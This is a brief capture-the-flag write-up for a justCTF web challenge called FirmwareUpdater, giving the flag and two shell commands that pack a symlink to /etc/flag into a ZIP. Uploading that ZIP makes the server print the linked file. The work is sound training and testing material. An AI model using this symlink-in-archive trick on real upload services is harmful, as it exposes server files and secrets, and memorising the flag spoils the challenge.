[../](../../)

# FirmwareUpdater

## WEB - Points: 106

> This device need a firmware! Upload and execute ASAP!

## Solution

Create a ZIP file that contains a symlink to `/etc/flag` with the name `README.md`:

	$ ln -s /etc/flag README.md
	$ zip --symlinks -u empty.zip README.md

Upload the file and the flag is printed out.

flag: `justCTF{A_Fin3_W4y_T0_Upd4t3_m3_y0}`